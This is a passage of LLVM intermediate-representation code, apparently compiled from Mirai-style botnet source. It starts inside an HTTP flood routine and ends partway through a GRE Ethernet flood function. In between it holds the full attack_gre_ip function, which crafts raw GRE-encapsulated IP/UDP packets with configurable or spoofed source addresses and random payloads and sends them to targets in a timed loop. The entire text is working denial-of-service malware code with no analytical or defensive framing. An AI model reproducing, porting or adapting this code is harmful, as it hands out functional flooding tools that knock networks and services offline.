  store i32 104, i32* %883, align 4
  br label %894

; <label>:892:                                    ; preds = %882
  %.pr580 = load i32, i32* %883, align 4
  %893 = icmp eq i32 %.pr580, 11
  br i1 %893, label %.loopexit591, label %894

; <label>:894:                                    ; preds = %.thread581, %892
  %895 = load i32, i32* %381, align 4
  %896 = call i32 @close(i32 %895) #10
  store i32 -1, i32* %381, align 4
  store i8 0, i8* %417, align 4
  br label %.loopexit591

; <label>:897:                                    ; preds = %882
  %898 = load i32, i32* %419, align 4
  %899 = add nsw i32 %898, %891
  store i32 %899, i32* %419, align 4
  store i32 %379, i32* %422, align 4
  br label %900

; <label>:900:                                    ; preds = %997, %897
  %901 = phi i32 [ %1004, %997 ], [ %899, %897 ]
  %902 = load i32, i32* %423, align 4
  %903 = icmp sgt i32 %902, 0
  br i1 %903, label %904, label %965

; <label>:904:                                    ; preds = %900
  %905 = icmp sgt i32 %902, %901
  %.sink14 = select i1 %905, i32* %419, i32* %423
  %906 = load i32, i32* %.sink14, align 4
  %907 = sub nsw i32 %902, %906
  store i32 %907, i32* %423, align 4
  %908 = load i32, i32* %424, align 4
  %909 = icmp eq i32 %908, 1
  br i1 %909, label %910, label %965

; <label>:910:                                    ; preds = %904
  %911 = call i8* @table_retrieve_val(i32 43, i32* null)
  %912 = call i32 @util_memsearch(i8* nonnull %420, i32 %901, i8* %911, i32 11)
  %913 = icmp eq i32 %912, -1
  br i1 %913, label %thread-pre-split573, label %914

; <label>:914:                                    ; preds = %910
  %915 = load i32, i32* %419, align 4
  %916 = call i8* @table_retrieve_val(i32 43, i32* null)
  %917 = call i32 @util_memsearch(i8* nonnull %420, i32 %915, i8* %916, i32 11)
  %918 = sext i32 %917 to i64
  %919 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %918
  %920 = load i32, i32* %419, align 4
  %921 = sub nsw i32 %920, %917
  %922 = call i32 @util_memsearch(i8* %919, i32 %921, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 1)
  %923 = add i32 %917, -1
  %924 = add i32 %923, %922
  %925 = sext i32 %924 to i64
  %926 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %925
  store i8 0, i8* %926, align 1
  %927 = load i32, i32* %426, align 4
  %928 = icmp slt i32 %927, 5
  br i1 %928, label %929, label %964

; <label>:929:                                    ; preds = %914
  %930 = call i32 @util_strlen(i8* %919) #10
  %931 = icmp slt i32 %930, 128
  br i1 %931, label %932, label %964

; <label>:932:                                    ; preds = %929
  %933 = load i32, i32* %426, align 4
  %934 = sext i32 %933 to i64
  %935 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %934, i64 0
  %936 = call i32 @util_strcpy(i8* %935, i8* %919) #10
  %937 = load i32, i32* %426, align 4
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %938, i64 0
  %940 = call i32 @util_strlen(i8* %939) #10
  %941 = sext i32 %940 to i64
  %942 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %938, i64 %941
  %943 = call i32 @util_strcpy(i8* %942, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0)) #10
  %944 = add i32 %917, 3
  %945 = add i32 %944, %922
  %946 = sext i32 %945 to i64
  %947 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %946
  %948 = load i32, i32* %419, align 4
  %949 = sub nsw i32 %948, %945
  %950 = call i32 @util_memsearch(i8* %947, i32 %949, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 1)
  %951 = add i32 %945, -1
  %952 = add i32 %951, %950
  %953 = sext i32 %952 to i64
  %954 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %953
  store i8 0, i8* %954, align 1
  %955 = load i32, i32* %426, align 4
  %956 = sext i32 %955 to i64
  %957 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %956, i64 0
  %958 = call i32 @util_strlen(i8* %957) #10
  %959 = sext i32 %958 to i64
  %960 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %956, i64 %959
  %961 = call i32 @util_strcpy(i8* %960, i8* %947) #10
  %962 = load i32, i32* %426, align 4
  %963 = add nsw i32 %962, 1
  store i32 %963, i32* %426, align 4
  br label %964

; <label>:964:                                    ; preds = %932, %929, %914
  store i32 -1, i32* %423, align 4
  store i8 10, i8* %417, align 4
  br label %.loopexit591

thread-pre-split573:                              ; preds = %910
  %.pr574 = load i32, i32* %423, align 4
  br label %965

; <label>:965:                                    ; preds = %thread-pre-split573, %904, %900
  %966 = phi i32 [ %.pr574, %thread-pre-split573 ], [ %907, %904 ], [ %902, %900 ]
  %.0522 = phi i32 [ %906, %thread-pre-split573 ], [ %906, %904 ], [ 0, %900 ]
  %967 = icmp eq i32 %966, 0
  br i1 %967, label %968, label %995

; <label>:968:                                    ; preds = %965
  %969 = load i32, i32* %425, align 4
  %970 = icmp eq i32 %969, 1
  %971 = load i32, i32* %419, align 4
  br i1 %970, label %972, label %990

; <label>:972:                                    ; preds = %968
  %973 = call i32 @util_memsearch(i8* nonnull %420, i32 %971, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %974 = icmp eq i32 %973, -1
  br i1 %974, label %995, label %975

; <label>:975:                                    ; preds = %972
  %976 = add nsw i32 %973, -2
  %977 = sext i32 %976 to i64
  %978 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %977
  store i8 0, i8* %978, align 1
  %979 = call i32 @util_memsearch(i8* nonnull %420, i32 %973, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1)
  %980 = icmp eq i32 %979, -1
  br i1 %980, label %984, label %981

; <label>:981:                                    ; preds = %975
  %982 = sext i32 %979 to i64
  %983 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %982
  store i8 0, i8* %983, align 1
  br label %984

; <label>:984:                                    ; preds = %975, %981
  %985 = call i32 @util_atoi(i8* nonnull %420, i32 16) #10
  %986 = icmp eq i32 %985, 0
  br i1 %986, label %987, label %988

; <label>:987:                                    ; preds = %984
  store i8 1, i8* %417, align 4
  br label %.loopexit591

; <label>:988:                                    ; preds = %984
  %989 = add nsw i32 %985, 2
  store i32 %989, i32* %423, align 4
  br label %995

; <label>:990:                                    ; preds = %968
  %991 = sub nsw i32 %971, %.0522
  store i32 %991, i32* %423, align 4
  %992 = icmp eq i32 %991, 0
  br i1 %992, label %993, label %995

; <label>:993:                                    ; preds = %990
  store i8 1, i8* %417, align 4
  br label %.loopexit591

.backedge:                                        ; preds = %995, %997
  %.pr = load i8, i8* %417, align 4
  %994 = icmp eq i8 %.pr, 7
  br i1 %994, label %878, label %.loopexit591.loopexit

; <label>:995:                                    ; preds = %972, %988, %990, %965
  %.1523 = phi i32 [ %973, %988 ], [ %.0522, %972 ], [ %.0522, %990 ], [ %.0522, %965 ]
  %996 = icmp eq i32 %.1523, 0
  br i1 %996, label %.backedge, label %997

; <label>:997:                                    ; preds = %995
  %998 = load i32, i32* %419, align 4
  %999 = sub nsw i32 %998, %.1523
  store i32 %999, i32* %419, align 4
  %1000 = sext i32 %.1523 to i64
  %1001 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %1000
  %1002 = sext i32 %999 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %420, i8* %1001, i64 %1002, i32 1, i1 false)
  %1003 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %1002
  store i8 0, i8* %1003, align 1
  %1004 = load i32, i32* %419, align 4
  %1005 = icmp eq i32 %1004, 0
  br i1 %1005, label %.backedge, label %900

.preheader592:                                    ; preds = %.preheader592.preheader, %.preheader592
  %1006 = tail call i32* @__errno_location() #11
  store i32 0, i32* %1006, align 4
  %1007 = load i32, i32* %381, align 4
  %1008 = call i64 @recv(i32 %1007, i8* nonnull %21, i64 10240, i32 16384) #10
  %1009 = trunc i64 %1008 to i32
  switch i32 %1009, label %.preheader592 [
    i32 0, label %.thread584
    i32 -1, label %1010
  ]

.thread584:                                       ; preds = %.preheader592
  store i32 104, i32* %1006, align 4
  br label %.thread578

; <label>:1010:                                   ; preds = %.preheader592
  %.pr583 = load i32, i32* %1006, align 4
  %1011 = icmp eq i32 %.pr583, 11
  br i1 %1011, label %1014, label %.thread578

.thread578:                                       ; preds = %1010, %.thread584
  %1012 = load i32, i32* %381, align 4
  %1013 = call i32 @close(i32 %1012) #10
  store i32 -1, i32* %381, align 4
  store i8 0, i8* %417, align 4
  br label %.loopexit591

; <label>:1014:                                   ; preds = %1010
  %.pr577 = load i8, i8* %417, align 4
  %1015 = icmp eq i8 %.pr577, 0
  br i1 %1015, label %.loopexit591, label %1016

; <label>:1016:                                   ; preds = %1014
  store i8 1, i8* %417, align 4
  br label %.loopexit591

.loopexit591.loopexit:                            ; preds = %.backedge
  br label %.loopexit591

.loopexit591:                                     ; preds = %.loopexit591.loopexit, %993, %987, %964, %.thread578, %416, %892, %1014, %405, %894, %1016, %874, %435, %.lr.ph633, %861, %700, %432, %401
  %indvars.iv.next660 = add nuw nsw i64 %indvars.iv659, 1
  %1017 = icmp slt i64 %indvars.iv.next660, %48
  br i1 %1017, label %.lr.ph633, label %.backedge596.loopexit

; <label>:1018:                                   ; preds = %30, %27, %24, %4
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i32 @util_strlen(i8*) local_unnamed_addr #3

declare i32 @util_strcpy(i8*, i8*) local_unnamed_addr #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #1

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

declare void @util_zero(i8*, i32) local_unnamed_addr #3

declare i8* @util_itoa(i32, i32, i8*) local_unnamed_addr #3

declare signext i8 @util_strcmp(i8*, i8*) local_unnamed_addr #3

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #1

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #3

declare i32 @util_stristr(i8*, i32, i8*) local_unnamed_addr #3

declare signext i8 @util_strncmp(i8*, i8*, i32) local_unnamed_addr #3

declare i32 @sleep(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 1)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 512)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 18, i32 0)
  %26 = trunc i32 %25 to i8
  %27 = load i32, i32* @LOCAL_ADDR, align 4
  %28 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 24, i32 %27)
  %29 = tail call i64 @time(i64* null) #10
  %30 = zext i32 %0 to i64
  %31 = add i64 %29, %30
  %32 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %.loopexit, label %34

; <label>:34:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %35 = bitcast i32* %6 to i8*
  %36 = call i32 @setsockopt(i32 %32, i32 0, i32 3, i8* nonnull %35, i32 4) #10
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %49, label %.preheader129

.preheader129:                                    ; preds = %34
  store i32 0, i32* %6, align 4
  %38 = zext i8 %1 to i32
  %39 = icmp eq i8 %1, 0
  %.pre133 = sext i32 %22 to i64
  %.pre134 = add nsw i64 %.pre133, 52
  br i1 %39, label %.preheader, label %.lr.ph131

.lr.ph131:                                        ; preds = %.preheader129
  %40 = trunc i64 %.pre134 to i16
  %41 = icmp ne i8 %17, 0
  %42 = add nsw i64 %.pre133, 28
  %43 = trunc i64 %42 to i16
  %44 = xor i16 %13, -1
  %45 = icmp eq i8 %26, 0
  %46 = add nsw i64 %.pre133, 8
  %47 = trunc i64 %46 to i16
  %48 = zext i8 %1 to i64
  br label %63

; <label>:49:                                     ; preds = %34
  %50 = call i32 @close(i32 %32) #10
  br label %.loopexit

..preheader_crit_edge:                            ; preds = %103
  %51 = trunc i64 %indvars.iv.next to i32
  store i32 %51, i32* %6, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader129, %..preheader_crit_edge
  %sext = shl i64 %31, 32
  %52 = ashr exact i64 %sext, 32
  %53 = icmp eq i32 %28, -1
  %54 = and i32 %12, 65535
  %55 = icmp eq i32 %54, 65535
  %56 = and i32 %18, 65535
  %57 = icmp eq i32 %56, 65535
  %58 = and i32 %20, 65535
  %59 = icmp eq i32 %58, 65535
  %60 = icmp eq i8 %26, 0
  %61 = icmp eq i8 %24, 0
  %62 = add i32 %22, 8
  br label %116

; <label>:63:                                     ; preds = %.lr.ph131, %103
  %indvars.iv = phi i64 [ 0, %.lr.ph131 ], [ %indvars.iv.next, %103 ]
  %64 = call noalias i8* @calloc(i64 1510, i64 8) #10
  %65 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv
  store i8* %64, i8** %65, align 8
  %66 = getelementptr inbounds i8, i8* %64, i64 24
  %67 = getelementptr inbounds i8, i8* %64, i64 44
  store i8 69, i8* %64, align 4
  %68 = getelementptr inbounds i8, i8* %64, i64 1
  store i8 %11, i8* %68, align 1
  %69 = call zeroext i16 @htons(i16 zeroext %40) #11
  %70 = getelementptr inbounds i8, i8* %64, i64 2
  %71 = bitcast i8* %70 to i16*
  store i16 %69, i16* %71, align 2
  %72 = call zeroext i16 @htons(i16 zeroext %13) #11
  %73 = getelementptr inbounds i8, i8* %64, i64 4
  %74 = bitcast i8* %73 to i16*
  store i16 %72, i16* %74, align 4
  %75 = getelementptr inbounds i8, i8* %64, i64 8
  store i8 %15, i8* %75, align 4
  br i1 %41, label %76, label %80

; <label>:76:                                     ; preds = %63
  %77 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %78 = getelementptr inbounds i8, i8* %64, i64 6
  %79 = bitcast i8* %78 to i16*
  store i16 %77, i16* %79, align 2
  br label %80

; <label>:80:                                     ; preds = %76, %63
  %81 = getelementptr inbounds i8, i8* %64, i64 9
  store i8 47, i8* %81, align 1
  %82 = getelementptr inbounds i8, i8* %64, i64 12
  %83 = bitcast i8* %82 to i32*
  store i32 %28, i32* %83, align 4
  %84 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv, i32 1
  %85 = load i32, i32* %84, align 4
  %86 = getelementptr inbounds i8, i8* %64, i64 16
  %87 = bitcast i8* %86 to i32*
  store i32 %85, i32* %87, align 4
  %88 = call zeroext i16 @htons(i16 zeroext 2048) #11
  %89 = getelementptr inbounds i8, i8* %64, i64 22
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 2
  store i8 69, i8* %66, align 4
  %91 = getelementptr inbounds i8, i8* %64, i64 25
  store i8 %11, i8* %91, align 1
  %92 = call zeroext i16 @htons(i16 zeroext %43) #11
  %93 = getelementptr inbounds i8, i8* %64, i64 26
  %94 = bitcast i8* %93 to i16*
  store i16 %92, i16* %94, align 2
  %95 = call zeroext i16 @htons(i16 zeroext %44) #11
  %96 = getelementptr inbounds i8, i8* %64, i64 28
  %97 = bitcast i8* %96 to i16*
  store i16 %95, i16* %97, align 4
  %98 = getelementptr inbounds i8, i8* %64, i64 32
  store i8 %15, i8* %98, align 4
  br i1 %41, label %99, label %103

; <label>:99:                                     ; preds = %80
  %100 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %101 = getelementptr inbounds i8, i8* %64, i64 30
  %102 = bitcast i8* %101 to i16*
  store i16 %100, i16* %102, align 2
  br label %103

; <label>:103:                                    ; preds = %99, %80
  %104 = getelementptr inbounds i8, i8* %64, i64 33
  store i8 17, i8* %104, align 1
  %. = select i1 %45, i32 1023, i32 %85
  %105 = getelementptr inbounds i8, i8* %64, i64 40
  %106 = bitcast i8* %105 to i32*
  store i32 %., i32* %106, align 4
  %107 = call zeroext i16 @htons(i16 zeroext %19) #11
  %108 = bitcast i8* %67 to i16*
  store i16 %107, i16* %108, align 2
  %109 = call zeroext i16 @htons(i16 zeroext %21) #11
  %110 = getelementptr inbounds i8, i8* %64, i64 46
  %111 = bitcast i8* %110 to i16*
  store i16 %109, i16* %111, align 2
  %112 = call zeroext i16 @htons(i16 zeroext %47) #11
  %113 = getelementptr inbounds i8, i8* %64, i64 48
  %114 = bitcast i8* %113 to i16*
  store i16 %112, i16* %114, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %115 = icmp slt i64 %indvars.iv.next, %48
  br i1 %115, label %63, label %..preheader_crit_edge

; <label>:116:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %39, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %116
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %161
  %storemerge128130 = phi i32 [ %188, %161 ], [ 0, %.lr.ph.preheader ]
  %117 = sext i32 %storemerge128130 to i64
  %118 = getelementptr inbounds i8*, i8** %9, i64 %117
  %119 = load i8*, i8** %118, align 8
  %120 = getelementptr inbounds i8, i8* %119, i64 24
  %121 = bitcast i8* %120 to %struct.iphdr*
  %122 = getelementptr inbounds i8, i8* %119, i64 44
  %123 = getelementptr inbounds i8, i8* %119, i64 52
  %124 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %117, i32 2
  %125 = load i8, i8* %124, align 4
  %126 = icmp ult i8 %125, 32
  br i1 %126, label %127, label %134

; <label>:127:                                    ; preds = %.lr.ph
  %128 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %117, i32 1
  %129 = load i32, i32* %128, align 4
  %130 = call i32 @ntohl(i32 %129) #11
  %131 = call i32 @htonl(i32 %130) #11
  %132 = getelementptr inbounds i8, i8* %119, i64 16
  %133 = bitcast i8* %132 to i32*
  store i32 %131, i32* %133, align 4
  br label %134

; <label>:134:                                    ; preds = %127, %.lr.ph
  br i1 %53, label %135, label %138

; <label>:135:                                    ; preds = %134
  %136 = getelementptr inbounds i8, i8* %119, i64 12
  %137 = bitcast i8* %136 to i32*
  store i32 0, i32* %137, align 4
  br label %138

; <label>:138:                                    ; preds = %135, %134
  br i1 %55, label %139, label %144

; <label>:139:                                    ; preds = %138
  %140 = getelementptr inbounds i8, i8* %119, i64 4
  %141 = bitcast i8* %140 to i16*
  store i16 0, i16* %141, align 4
  %142 = getelementptr inbounds i8, i8* %119, i64 28
  %143 = bitcast i8* %142 to i16*
  store i16 999, i16* %143, align 4
  br label %144

; <label>:144:                                    ; preds = %139, %138
  br i1 %57, label %145, label %147

; <label>:145:                                    ; preds = %144
  %146 = bitcast i8* %122 to i16*
  store i16 0, i16* %146, align 2
  br label %147

; <label>:147:                                    ; preds = %145, %144
  br i1 %59, label %148, label %151

; <label>:148:                                    ; preds = %147
  %149 = getelementptr inbounds i8, i8* %119, i64 46
  %150 = bitcast i8* %149 to i16*
  store i16 0, i16* %150, align 2
  br label %151

; <label>:151:                                    ; preds = %148, %147
  br i1 %60, label %156, label %152

; <label>:152:                                    ; preds = %151
  %153 = getelementptr inbounds i8, i8* %119, i64 16
  %154 = bitcast i8* %153 to i32*
  %155 = load i32, i32* %154, align 4
  br label %156

; <label>:156:                                    ; preds = %151, %152
  %.sink3 = phi i32 [ %155, %152 ], [ 0, %151 ]
  %157 = getelementptr inbounds i8, i8* %119, i64 40
  %158 = bitcast i8* %157 to i32*
  store i32 %.sink3, i32* %158, align 4
  br i1 %61, label %161, label %159

; <label>:159:                                    ; preds = %156
  call void @rand_alphastr(i8* nonnull %123, i32 %22)
  %160 = getelementptr inbounds i8, i8* %123, i64 %.pre133
  store i8 0, i8* %160, align 1
  %.pre = load i32, i32* %6, align 4
  br label %161

; <label>:161:                                    ; preds = %156, %159
  %162 = phi i32 [ %storemerge128130, %156 ], [ %.pre, %159 ]
  %163 = getelementptr inbounds i8, i8* %119, i64 10
  %164 = bitcast i8* %163 to i16*
  store i16 0, i16* %164, align 2
  %165 = bitcast i8* %119 to i16*
  %166 = call zeroext i16 @checksum_generic(i16* %165, i32 20)
  store i16 %166, i16* %164, align 2
  %167 = getelementptr inbounds i8, i8* %119, i64 34
  %168 = bitcast i8* %167 to i16*
  store i16 0, i16* %168, align 2
  %169 = bitcast i8* %120 to i16*
  %170 = call zeroext i16 @checksum_generic(i16* %169, i32 20)
  store i16 %170, i16* %168, align 2
  %171 = getelementptr inbounds i8, i8* %119, i64 50
  %172 = bitcast i8* %171 to i16*
  store i16 0, i16* %172, align 2
  %173 = getelementptr inbounds i8, i8* %119, i64 48
  %174 = bitcast i8* %173 to i16*
  %175 = load i16, i16* %174, align 2
  %176 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %121, i8* nonnull %122, i16 zeroext %175, i32 %62)
  store i16 %176, i16* %172, align 2
  %177 = sext i32 %162 to i64
  %178 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %177, i32 0, i32 0
  store i16 2, i16* %178, align 4
  %179 = getelementptr inbounds i8, i8* %119, i64 16
  %180 = bitcast i8* %179 to i32*
  %181 = load i32, i32* %180, align 4
  %182 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %177, i32 0, i32 2, i32 0
  store i32 %181, i32* %182, align 4
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %177, i32 0, i32 1
  store i16 0, i16* %183, align 2
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %177, i32 0
  %185 = bitcast %struct.sockaddr_in* %184 to %struct.sockaddr*
  %186 = call i64 @sendto(i32 %32, i8* nonnull %119, i64 %.pre134, i32 16384, %struct.sockaddr* %185, i32 16) #10
  %187 = load i32, i32* %6, align 4
  %188 = add nsw i32 %187, 1
  store i32 %188, i32* %6, align 4
  %189 = icmp slt i32 %188, %38
  br i1 %189, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %161
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %116
  %190 = call i64 @time(i64* null) #10
  %191 = icmp sgt i64 %190, %52
  br i1 %191, label %.loopexit.loopexit, label %116

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %49
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %10 = zext i8 %1 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 8) #10
  %12 = bitcast i8* %11 to i8**
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %16 = trunc i32 %15 to i16
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %18 = trunc i32 %17 to i8
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 1)
  %20 = trunc i32 %19 to i8
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 512)
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %27 = trunc i32 %26 to i8
  %28 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 18, i32 0)
  %29 = trunc i32 %28 to i8
  %30 = load i32, i32* @LOCAL_ADDR, align 4
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 24, i32 %30)
  %32 = tail call i64 @time(i64* null) #10
  %33 = zext i32 %0 to i64
  %34 = add i64 %32, %33
  %35 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %.loopexit, label %37

; <label>:37:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %38 = bitcast i32* %6 to i8*
  %39 = call i32 @setsockopt(i32 %35, i32 0, i32 3, i8* nonnull %38, i32 4) #10
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %52, label %.preheader136

.preheader136:                                    ; preds = %37
  store i32 0, i32* %6, align 4
  %41 = zext i8 %1 to i32
  %42 = icmp eq i8 %1, 0
  %.pre = sext i32 %25 to i64
  %.pre140 = add nsw i64 %.pre, 66
  br i1 %42, label %.preheader, label %.lr.ph138

.lr.ph138:                                        ; preds = %.preheader136
  %43 = trunc i64 %.pre140 to i16
  %44 = icmp ne i8 %20, 0
  %45 = add nsw i64 %.pre, 28
  %46 = trunc i64 %45 to i16
  %47 = xor i16 %16, -1
  %48 = icmp eq i8 %29, 0
  %49 = add nsw i64 %.pre, 8
  %50 = trunc i64 %49 to i16
  %51 = zext i8 %1 to i64
  br label %70

; <label>:52:                                     ; preds = %37
  %53 = call i32 @close(i32 %35) #10
  br label %.loopexit

..preheader_crit_edge:                            ; preds = %113
  %54 = trunc i64 %indvars.iv.next to i32
  store i32 %54, i32* %6, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader136, %..preheader_crit_edge
  %sext = shl i64 %34, 32
  %55 = ashr exact i64 %sext, 32
  %56 = icmp eq i32 %31, -1
  %57 = and i32 %15, 65535
  %58 = icmp eq i32 %57, 65535
  %59 = and i32 %21, 65535
  %60 = icmp eq i32 %59, 65535
  %61 = and i32 %23, 65535
  %62 = icmp eq i32 %61, 65535
  %63 = icmp eq i8 %29, 0
  %64 = bitcast i32* %7 to i8*
  %65 = bitcast i32* %8 to i8*
  %66 = bitcast i32* %9 to i8*
  %67 = getelementptr inbounds i8, i8* %66, i64 2
  %68 = icmp eq i8 %27, 0
  %69 = add i32 %25, 8
  br label %126

; <label>:70:                                     ; preds = %.lr.ph138, %113
  %indvars.iv = phi i64 [ 0, %.lr.ph138 ], [ %indvars.iv.next, %113 ]
